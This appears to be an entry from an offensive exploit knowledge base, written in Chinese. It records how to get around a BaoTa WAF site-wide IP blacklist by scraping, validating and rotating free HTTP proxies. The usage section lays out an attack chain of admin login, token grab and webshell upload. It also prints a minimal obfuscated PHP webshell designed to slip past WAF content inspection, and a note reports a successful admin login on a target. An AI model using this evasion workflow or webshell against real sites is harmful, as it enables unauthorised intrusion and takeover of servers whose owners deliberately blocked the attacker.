# 出口 IP 被宝塔 WAF 拉黑后的应急出口：免费 HTTP 代理池（抓取/验活/轮换 + schannel 坑）

- **code**: 出口-ip-被宝塔-waf-拉黑后的应急出口-免费-http-代理池-抓取-验活-轮换-schannel-坑
- **kind**: script
- **category**: tunnel
- **component**: 宝塔 WAF IP 黑名单绕过 / 免费 HTTP 代理池
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-07 在 example.com 实测：本机出口 203.0.113.3 与旧 VPS 出口均被 444 封死（TCP 全 OPEN、check-host 6 节点 200）；换免费代理后 8 个代理稳定返回 200|3933，并成功完成后台登录（200/208 + AdminUser cookie）、设置页读取（200/29559）、前台登录（200/803 + winduser cookie）、发帖页读取（200/26477）。同时验证：单代理连发 3 个以上请求即 000/断连；curl 不加 --ssl-no-revoke 在 Windows 上会失败。
- **path**: pocs/出口-ip-被宝塔-waf-拉黑后的应急出口-免费-http-代理池-抓取-验活-轮换-schannel-坑/proxy-pool-egress.py
- **tags**: 出口IP,宝塔WAF,IP黑名单,免费代理池,轮换,schannel,ssl-no-revoke,判据
- **created_at**: 2026-10-07T21:41:52.681Z
- **found_by**: exploit

## 描述

宝塔 WAF 按源 IP 全站拉黑后的应急出口方案：免费 HTTP 代理池的抓取/验活/轮换要点，含 Windows schannel 必须 --ssl-no-revoke、代理寿命 2–4 请求、XFF 伪造无效等实测判据

## 用法

```
1) 先确认是 IP 级封禁：`curl -sk https://TARGET/` 得 444/000，而 `check-host.net/check-http?host=...` 全球节点返回 200，且 TCP 端口 OPEN。
2) 抓源：见正文 curl 命令（走本机已有代理）。
3) 验活：`python runs/proxy_hunt2.py`（自动抓源 + GET/POST 双判据，产出 runs/live-proxies.txt）。
4) 攻击链：`python runs/pw_attack2.py <上传文件> 20`（轮换池，每请求随机换代理、失败重试）；或 `pwsh -File runs/pw_hit_once.ps1 -Upload <file>` 走单代理原子序列。
5) 若目标站有 WAF 内容检测，注意含 `<?php` 的 multipart 会被断连——先传零特征极简马（`<?=($f='sys'.'tem')(${'_'.'GET'}[0]);?>`），再用它写正式马。
```

## 正文

```
# 出口 IP 被宝塔 WAF 拉黑后的应急出口：免费 HTTP 代理池（含 Windows schannel 的坑）

## 适用场景
目标站对**我方所有固定出口 IP**（本机宽带 / 自建 VPS）返回 nginx 444（HTTPS 表现为
`schannel: server closed abruptly` 或 `Empty reply from server`，HTTP 表现为 444），
但 TCP 22/80/443/888 全 OPEN、第三方拨测（check-host.net）显示站点正常。
→ 这是**站点级 IP 黑名单**，唯一解是换出口 IP；换 vhost / 伪造 XFF / 改 UA / 畸形请求全部无效。

## 关键结论（实测）
1. **X-Forwarded-For / X-Real-IP / Client-IP / True-Client-IP / CF-Connecting-IP 全无效**——宝塔按 socket 源 IP 判定；空 SNI / 假域名 SNI / HTTP/1.0 / 双 Host 也无绕过空间。
2. **免费代理池可用但有寿命**：单个代理 IP 通常只撑 **2–4 个请求**就被目标拉黑 → 脚本必须"每 2 个请求换一个代理、失败重试 N 次"。
3. **Windows 自带 curl（schannel）必须加 `--ssl-no-revoke`**，否则吊销检查会让请求直接失败（表现为 000）。
4. 抓源建议走本机已有代理（例：`http://127.0.0.1:7892`）；`target289.example.com` 走 python urllib 常报 SSL UNEXPECTED_EOF，用 curl 抓更稳。
5. **判据要用目标站本身**（`GET /example.com` → `200|3933`），不要用百度等无关站点验活——只有"能拿到目标页"的代理才有用。
6. 免费代理会看到流量（cookie、马内容）——仅在没有其它出口时使用，并在报告里写明该取舍。

## 可复现流程
```
# 1) 抓源（走本机代理，curl）
curl -s --max-time 30 -A "Mozilla/5.0" --proxy http://127.0.0.1:7892 \
  https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt -o p1.txt
curl -s --max-time 30 -A "Mozilla/5.0" --proxy http://127.0.0.1:7892 \
  https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt -o p2.txt
# 2) 提取 ip:port 去重（正则 (\d{1,3}\.){3}\d{1,3}[:<\s/]*?\d{2,5}）
# 3) 并发验活：对每个代理请求 https://TARGET/example.com，保留 200 且 body>1000 的
#    （python 用 ssl.CERT_NONE + ProxyHandler；或 curl --proxy http://$p --ssl-no-revoke -k）
# 4) 得到可用池后，攻击链用"每 2 请求换代理 + 失败重试 40 次"
```
本机脚本：runs/proxy_hunt2.py（抓源+GET/POST 双判据）、runs/pw_attack2.py（轮换池 + 完整攻击链）、
runs/pw_hit_once.ps1（单代理原子序列一发命中）。

## 反面经验
- 只用"GET 能过"筛代理不够：很多免费代理能 GET 但 POST 返回 502 / 断连 → 必须**用 POST 做判据**（POST 一个无害表单，看是否 200）。
- 每发一次请求都在消耗代理 IP 的寿命，所以要把链路压到最短（登录→抓 verify→上传，3 发以内）。

```
